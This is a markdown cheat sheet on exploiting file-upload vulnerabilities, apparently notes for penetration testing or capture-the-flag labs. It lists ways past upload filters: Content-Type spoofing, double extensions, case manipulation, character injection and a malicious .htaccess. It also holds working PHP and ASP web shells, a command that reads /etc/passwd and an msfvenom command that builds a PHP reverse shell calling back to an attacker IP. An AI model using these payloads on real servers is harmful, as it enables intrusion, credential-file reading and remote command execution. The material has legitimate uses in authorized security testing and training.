# Uplaod Vulnerabilities

## Prerequisite:

### Find an upload page using directory bruteforce (gobuster), or you may find it on an admin dashboard of a CMS application.

## Overwriting existing files:

### Simply put, rename your payload to the same name of the file you want to overwrite then upload.

## Content-Type Bypass

Upon launching your file, open BurpSuite and change the Content-Type header to something the server accepts.

For example, when uploading a .php shell and the server accepts .png files, you can change the header from:

    application/x-php
    
to

    image/png

Then simply forward the request for the file to be uploaded.


## Double Extension

If the server accepts for example only .png files, but does not validate the content properly, simply add a second valid extension in front of your reverse shell file.

For example, from

    shell.php

to

    shell.php.png

Upload the file to get your shell.

## Image size validation bypass

If the file you want to upload exceeds the file size e.g. 1kb, it won't be accepted by the server.

Hence, we can use a way smaller file like the simple-backdoor.php

    cp /usr/share/webshells/php/simple-backdoor.php /root/Desktop/

After uploading, access you shell to example URL where file uploads migth be located:

    http://domain.local/uploads/simple-backdoor.php?cmd=id

## Blacklisted Extenstion file upload

Some applications might blacklist extensions like .php for example.

To bypass this you can just rename the extension by manipulating the cases.

For example:

    shell.PHP
    shell.pHp
    shell.phP

But before getting your shell, we might need to upload an .htaccess file with the content:

    AddType application/x-httpd-php PHP

Sve the file, then upload it to the server. After that, try to reupload your file.

Upload the file to get your shell if bypassed successfully.

## Web Shells

| **Web Shell**   | **Description**   |
| --------------|-------------------|
| `<?php file_get_contents('/etc/passwd'); ?>` | Basic PHP File Read |
| `<?php system('hostname'); ?>` | Basic PHP Command Execution |
| `<?php system($_REQUEST['cmd']); ?>` | Basic PHP Web Shell |
| `<% eval request('cmd') %>` | Basic ASP Web Shell |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell |
| [PHP Web Shell](https://github.com/Arrexel/phpbash) | PHP Web Shell |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP Reverse Shell |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |

## Bypasses

| **Command**   | **Description**   |
| --------------|-------------------|
| **Client-Side Bypass** |
| `[CTRL+SHIFT+C]` | Toggle Page Inspector |
| **Blacklist Bypass** |
| `shell.phtml` | Uncommon Extension |
| `shell.pHp` | Case Manipulation |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions |
| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) | List of ASP Extensions |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) | List of Web Extensions |
| **Whitelist Bypass** |
| `shell.jpg.php` | Double Extension |
| `shell.php.jpg` | Reverse Double Extension |
| `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…` | Character Injection - Before/After Extension |
| **Content/Type Bypass** |
| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) | List of Web Content-Types |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | List of All Content-Types |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) | List of File Signatures/Magic Bytes |

## Limited Uploads

| **Potential Attack**   | **File Types** |
| --------------|-------------------|
| `XSS` | HTML, JS, SVG, GIF |
| `XXE`/`SSRF` | XML, SVG, PDF, PPT, DOC |
| `DoS` | ZIP, JPG, PNG |
